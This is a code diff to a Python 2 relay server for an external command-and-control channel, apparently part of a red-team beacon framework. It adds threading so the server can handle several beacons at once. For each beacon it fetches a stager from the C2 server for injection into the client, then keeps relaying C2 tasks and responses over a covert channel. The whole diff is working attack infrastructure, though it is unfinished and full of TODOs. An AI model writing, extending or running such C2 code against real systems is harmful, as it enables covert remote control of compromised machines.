@@ -5,6 +5,10 @@ import configureStage
 import establishedSession
 import config
 from time import sleep
+import beacon
+import threading
+import Queue
+
 
 def importModule(modName, modType):
 	"""
@@ -15,6 +19,61 @@ def importModule(modName, modType):
 	importName = "import utils." + modType + "s." + modName + " as " + modType
 	exec(importName, globals())
 
+
+def task_loop(beacon_obj):
+	"""
+	This function should definitely be called as a thread
+
+	:param beacon_obj: An already declared beacon.Beacon object, Beacon.beacon_id should already be defined.
+	:return:
+	"""
+
+	# Start with logic to setup the connection to the external_c2 server
+	beacon_obj.sock = commonUtils.createSocket() # TODO: Move to when the server polls for a new beacon
+
+	# TODO: Add logic that will check and recieve a confirmation from the client that it is ready to recieve and inject the stager
+	# Poll covert channel for 'READY2INJECT' message from client
+	#       * We can make the client send out 'READY2INJECT' msg from client periodically when it doesn't have a running beacon so that we don't miss it
+	if config.verbose:
+		print commonUtils.color("Client ready to recieve stager")
+
+	# Let's get the stager from the c2 server
+	stager_status = configureStage.loadStager(beacon_obj)
+
+	if stager_status != 0:
+		# Something went horribly wrong
+		print commonUtils.color("Beacon {}: Something went terribly wrong while configuring the stager!", status=False,
+								warning=True).format(beacon_obj.beacon_id)
+		sys.exit(1) # TODO: Have this instead exit the thread, rather than the application
+
+	# TODO: Add logic that will check and recieve confirmation from the client that it is ready to recieve and process commands
+	# Poll covert channel for 'READY4CMDS' message from client
+
+	# Now that the stager is configured, lets start our main loop for the beacon
+	while True:
+		if config.verbose:
+			print commonUtils.color("Beacon {}: Checking the c2 server for new tasks...").format(beacon_obj.beacon_id)
+
+		# Each beacon has it's own unique socket, so no need for framework to be aware of our internal beacon id
+		newTask = establishedSession.checkForTasks(beacon_obj.sock)
+
+		# Stuff task into data model
+		task_frame = [beacon_obj.beacon_id, newTask]
+		# once we have a new task (even an empty one), lets relay that to our client
+		if config.debug:
+			print commonUtils.color("Beacon {}: Encoding and relaying task to client", status=False, yellow=True).format(beacon_obj.beacon_id)
+
+		# Task frame contains beacon_id in it
+		establishedSession.relayTask(task_frame)
+		# Attempt to retrieve a response from the client
+		if config.verbose:
+			print commonUtils.color("Beacon {}: Checking the client for a response...").format(beacon_obj.beacon_id)
+		b_response_frame = establishedSession.checkForResponse(beacon_obj.beacon_id)
+		b_response_data = b_response_frame[1]
+
+		# Let's relay this response to the c2 server
+		establishedSession.relayResponse(beacon_obj.sock, b_response_data)
+		sleep(int(beacon_obj.block_time) / 100)  # python sleep is in seconds, C2_BLOCK_TIME in milliseconds
 
 def main():
 	# Argparse for certain options
@@ -39,67 +98,58 @@ def main():
 	# Import our defined encoder and transport modules
 	if config.verbose:
 		print (commonUtils.color("Importing encoder module: ") + "%s") % (config.ENCODER_MODULE)
-	importModule(config.ENCODER_MODULE, "encoder")
+	importModule(config.ENCODER_MODULE, "encoder") # TODO: Why does this exist twice?
 	commonUtils.importModule(config.ENCODER_MODULE, "encoder")
 	if config.verbose:
 		print (commonUtils.color("Importing transport module: ") + "%s") % (config.TRANSPORT_MODULE)
-	importModule(config.TRANSPORT_MODULE, "transport")
+	importModule(config.TRANSPORT_MODULE, "transport") # TODO: why does this exist twice?
 	commonUtils.importModule(config.TRANSPORT_MODULE, "transport")
 
+	# TODO: Check here whether we're doing batch processing; if not, have prepTransport run in beacon thread instead
+	# Prep the transport module
+	prep_trans = transport.prepTransport()
 
-	try:
-		# Start with logic to setup the connection to the external_c2 server
-		sock = commonUtils.createSocket()
-
-		# TODO: Add logic that will check and recieve a confirmation from the client that it is ready to recieve and inject the stager
-		# Poll covert channel for 'READY2INJECT' message from client
-		#       * We can make the client send out 'READY2INJECT' msg from client periodically when it doesn't have a running beacon so that we don't miss it
-		# if args.verbose:
-		#       print commonUtils.color("Client ready to recieve stager")
-
-		# #####################
-
-		# Prep the transport module
-		prep_trans = transport.prepTransport()
-
-		# Let's get the stager from the c2 server
-		stager_status = configureStage.loadStager(sock)
-
-		if stager_status != 0:
-			# Something went horribly wrong
-			print commonUtils.color("Something went terribly wrong while configuring the stager!", status=False, warning=True)
-			sys.exit(1)
-
-		# TODO: Add logic that will check and recieve confirmation from the client that it is ready to recieve and process commands
-		# Poll covert channel for 'READY4CMDS' message from client
-
-		# Now that the stager is configured, lets start our main loop
-		while True:
-			if config.verbose:
-				print commonUtils.color("Checking the c2 server for new tasks...")
-
-			newTask = establishedSession.checkForTasks(sock)
-
-			# once we have a new task (even an empty one), lets relay that to our client
+	active_beacons = [] # TODO: May need to be a global? This will become obsolete if db functionality is implemented
+	new_beacon_queue = Queue.Queue()
+	while True:
+		try:
+			# TODO: add logic to check for new beacons here that will return a beacon.Beacon object
 			if config.debug:
-				print commonUtils.color("Encoding and relaying task to client", status=False, yellow=True)
-			establishedSession.relayTask(newTask)
-			# Attempt to retrieve a response from the client
-			if config.verbose:
-				print commonUtils.color("Checking the client for a response...")
-			b_response = establishedSession.checkForResponse()
+				print commonUtils.color("Checking for new clients", status=False,
+										yellow=True)
+			new_client = commonUtils.get_new_clients()
+			if new_client is not 0:
+				new_client_obj = beacon.Beacon()
+				new_client_obj.beacon_id = new_client[0]
+				new_client_obj.block_time = new_client[1][0]
+				new_client_obj.pipe_name = new_client[1][1]
+				new_client_obj.beacon_arch = new_client[1][2]
+				new_beacon_queue.put(new_client_obj)
+			while not new_beacon_queue.empty():
+				try:
+					beacon_obj = new_beacon_queue.get()
+					print commonUtils.color("Attempting to start session for beacon {}").format(beacon_obj.beacon_id)
+					t = threading.Thread(target=task_loop, args=(beacon_obj,))
+					t.daemon=True
+					t.start()
+					if config.debug:
+						print commonUtils.color("Thread started", status=False,
+												yellow=True)
+					# Restart this loop
+					pass
+				except Exception as e:
+					print commonUtils.color("Error occured while attempting to start beacon {}", status=False, warning=True).format(beacon_obj.beacon_id)
+					print commonUtils.color("Exception is: {}", status=False, warning=True).format(e)
+					pass
 
-			# Let's relay this response to the c2 server
-			establishedSession.relayResponse(sock, b_response)
-			sleep(config.C2_BLOCK_TIME/100) # python sleep is in seconds, C2_BLOCK_TIME in milliseconds
+		except KeyboardInterrupt:
+			if config.debug:
+				print commonUtils.color("\nClosing all sockets to the c2 server")
+			commonUtils.killSocket(beacon_obj.sock) # TODO Kill all sockets for every active beacon
+			print commonUtils.color("\nExiting...", warning=True)
+			sys.exit(0)
 
-
-			# Restart this loop
-	except KeyboardInterrupt:
-		if config.debug:
-			print commonUtils.color("\nClosing the socket to the c2 server")
-		commonUtils.killSocket(sock)
-		print commonUtils.color("\nExiting...", warning=True)
-		sys.exit(0)
+		# TODO: Determine best way to determine how long to sleep between checks for new beacons
+		sleep(120) # Default timer between new beacon checks
 
 main()
